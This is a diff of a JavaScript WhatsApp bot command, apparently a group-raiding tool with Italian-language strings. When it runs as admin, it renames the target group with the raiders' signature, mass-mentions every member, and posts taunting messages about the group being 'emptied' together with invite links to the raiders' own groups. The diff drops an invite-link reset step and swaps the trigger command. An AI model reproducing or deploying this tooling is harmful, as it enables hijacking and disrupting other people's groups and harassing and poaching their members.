@@ -1,4 +1,4 @@
-let handler = async (m, { conn, participants, isBotAdmin }) => {
+ let handler = async (m, { conn, participants, isBotAdmin }) => {
     if (!m.isGroup) return;
 
     const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
@@ -12,20 +12,10 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
     try {
         let metadata = await conn.groupMetadata(m.chat);
         let oldName = metadata.subject;
-        let newName = `${oldName} | 𝑺𝑽𝑻 𝑩𝒀  ๖ۣۜ𝚯вΞ𝚈яΛ, ꪜꫀꪶᛕ᥅ꪗꪀ_»»✈︎ & 𝕯𝕰𝕸𝕺𝕹𝕾`;
+        let newName = `${oldName} | 𝑺𝑽𝑻 𝑩𝒀 |̲̅̅E̲̅̅|̲̅̅N̲̅̅|̲̅̅D̲̅̅|̲̅̅Y̲̅̅|`;
         await conn.groupUpdateSubject(m.chat, newName);
     } catch (e) {
         console.error('Errore cambio nome gruppo:', e);
-    }
-
-    // 🔹 RESET LINK GRUPPO
-    let newInviteLink = '';
-    try {
-        await conn.groupRevokeInvite(m.chat); // invalida il vecchio link
-        let code = await conn.groupInviteCode(m.chat); // prende il nuovo codice
-        newInviteLink = `https://chat.whatsapp.com/${code}`;
-    } catch (e) {
-        console.error('Errore reset link:', e);
     }
 
     let usersToRemove = participants
@@ -41,16 +31,19 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
     let allJids = participants.map(p => p.jid);
 
     await conn.sendMessage(m.chat, {
-        text: "๖ۣۜ𝚯вΞ𝚈яΛ, 𝕯𝕰𝕸𝕺𝕹𝕾, ꪜꫀꪶᛕ᥅ꪗꪀ_»»✈︎ 𝑹𝑬𝑮𝑵𝑨𝑵𝑶 𝑨𝑵𝑪𝑯𝑬 𝑸𝑼𝑬𝑺𝑻𝑶 𝑮𝑹𝑼𝑷𝑷𝑶"
+        text: "𝒍𝒂𝒔𝒄𝒊𝒂 𝒄𝒉𝒆 𝒊𝒍 𝒗𝒆𝒏𝒕𝒐 𝒗𝒊 𝒔𝒑𝒂𝒛𝒛𝒊 𝒗𝒊𝒂 𝒄𝒐𝒎𝒆 𝒖𝒏𝒂 𝒑𝒊𝒖𝒎𝒂,𝒂𝒃𝒃𝒂𝒊𝒂𝒕𝒆 𝒅𝒂𝒗𝒂𝒏𝒕𝒊 𝒂 𝒐𝒃𝒔𝒊𝒅𝒊𝒂𝒏..."
     });
 
     await conn.sendMessage(m.chat, {
-        text: `𝑴𝑨𝑵𝑫𝑨𝑻𝑬 𝑹𝑰𝑪𝑯𝑰𝑬𝑺𝑻𝑨 𝑸𝑼𝑰, 𝑨𝑷𝑹𝑰𝑨𝑴𝑶 𝑨 200 𝑹𝑰𝑪𝑯𝑰𝑬𝑺𝑻𝑬: https://chat.whatsapp.com/EYakbP0qa2RJkSodReJExC?mode=hqctcla
-
-𝑴𝑨𝑵𝑫𝑨𝑻𝑬 𝑹𝑰𝑪𝑯𝑰𝑬𝑺𝑻𝑨 𝑸𝑼𝑰, 𝑨𝑷𝑹𝑰𝑨𝑴𝑶 𝑨 200 𝑹𝑰𝑪𝑯𝑰𝑬𝑺𝑻𝑬:https://chat.whatsapp.com/L65rzQ0dx4G7TIkNCQ1xPY?mode=hqctcla
+        text: "𝑨𝒗𝒆𝒕𝒆 𝒂𝒗𝒖𝒕𝒐 𝒍'𝒐𝒏𝒐𝒓𝒆 𝒅𝒊 𝒆𝒔𝒔𝒆𝒓𝒆 𝒔𝒕𝒂𝒕𝒊 𝒔𝒗𝒖𝒐𝒕𝒂𝒕𝒊 𝒅𝒂 乇ห∂y 𝑽𝒊 𝒂𝒔𝒑𝒆𝒕𝒕𝒊𝒂𝒎𝒐 𝒕𝒖𝒕𝒕𝒊 𝒒𝒖𝒊:https://chat.whatsapp.com/EPY9EqMNV6XD0PmVk8jbEb?mode=gi_t
 
 
-𝑬𝑫 𝑬𝑵𝑻𝑹𝑨𝑻𝑬 𝑸𝑼𝑰:https://chat.whatsapp.com/J8j93Kx83jHI6G6udViWaO?mode=gi_t`,
+https://chat.whatsapp.com/KtvOQfjpCjFFPWAdBXKOXw
+
+
+
+
+https://chat.whatsapp.com/JkSXVGW8FsDEvttnPJXpfu?mode=hqctcli",
         mentions: allJids
     });
 
@@ -62,7 +55,7 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
     }
 };
 
-handler.command = ['svuota'];
+handler.command = ['scopo'];
 handler.group = true;
 handler.botAdmin = true;
 handler.owner = true;
